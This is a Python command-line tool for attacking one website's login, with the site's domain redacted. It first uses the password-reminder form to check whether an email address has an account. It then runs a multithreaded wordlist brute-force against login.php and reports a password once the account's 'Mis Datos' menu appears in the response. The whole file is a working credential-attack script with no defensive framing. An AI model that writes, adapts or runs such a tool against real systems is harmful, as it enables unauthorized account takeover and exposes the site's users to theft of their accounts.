import sys
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed


def validate_email(email):
    url = "https://redacted.com/login.php"

    data = {"email": email, "recordar": "clave"}

    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    print(f"🔍 Validating email: {email}")

    try:
        response = requests.post(url, data=data, headers=headers, timeout=5)
        response_text = response.text

        if (
            "<table width='100%' cellspacing='0' border='0'><tr><td class='ok'>"
            in response_text
        ):
            print("✅ Email valid")
            return True
        elif (
            "<table width='100%' cellspacing='0' border='0'><tr><td class='error'>"
            in response_text
        ):
            print("❌ Email invalid")
            return False
        else:
            print("⚠️ Unexpected response when validating email. Check manually")
            return False

    except requests.exceptions.Timeout:
        print("⏳ Timeout: Could not validate email")
        return False
    except requests.exceptions.RequestException as e:
        print(f"❌ Error: {e}")
        return False


def bruteforce_email(email, pw_file, num_threads=1):
    print(
        f"🔥 Starting bruteforce attack on {email} using {pw_file} with {num_threads} threads"
    )

    try:
        with open(pw_file, "r", encoding="utf-8") as file:
            passwords = file.readlines()

            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                futures = []
                for index, line in enumerate(passwords, start=1):
                    password = line.strip()
                    futures.append(executor.submit(attempt_login, email, password))

                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        print(f"✅ Password found: {result}")
                        return

    except FileNotFoundError:
        sys.exit(f"❌ Error: Password file '{pw_file}' not found")
    except Exception as e:
        sys.exit(f"❌ An unexpected error occurred: {str(e)}")


def attempt_login(email, password):

    url = "https://redacted.com/login.php"

    data = {"user": email, "pass": password, "aceptar": "Enviar"}

    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    print(f"Attempting password: {password}")

    try:
        response = requests.post(url, data=data, headers=headers, timeout=5)
        response_text = response.text

        if '<span class="menu-text">Mis Datos</span></a></li>' in response_text:
            return password
        elif "<td class='error'>E-mail o clave incorrectosss</td>" in response_text:
            return None
        else:
            print("⚠️ Unexpected response when bruteforcing. Check manually")
            sys.exit(1)

    except requests.exceptions.Timeout:
        print(f"⏳ Timeout: Skipping {password}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"❌ Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Validate email & bruteforce password")
    parser.add_argument(
        "-e", "--email", required=True, help="The email address to validate"
    )
    parser.add_argument(
        "-v", "--validate", action="store_true", help="Check if the email is valid"
    )
    parser.add_argument(
        "-b", "--bruteforce", action="store_true", help="Bruteforce password"
    )
    parser.add_argument("-f", "--file", required=False, help="File of passwords")
    parser.add_argument(
        "-t", "--threads", type=int, default=1, help="Number of threads for bruteforce"
    )

    args = parser.parse_args()

    if args.bruteforce and not args.file:
        sys.exit(
            "❌ Error: You must provide a password file (-f) when using bruteforce (-b)"
        )

    if args.file and not args.bruteforce:
        sys.exit(
            "❌ Error: You must use bruteforce (-b) when specifying a password file (-f)"
        )

    if args.validate:
        if not validate_email(args.email):
            sys.exit("❌ Email validation failed. Bruteforce will not be attempted")

    if args.bruteforce:
        bruteforce_email(args.email, args.file, num_threads=args.threads)

    if not args.validate and not args.bruteforce:
        validate_email(args.email)
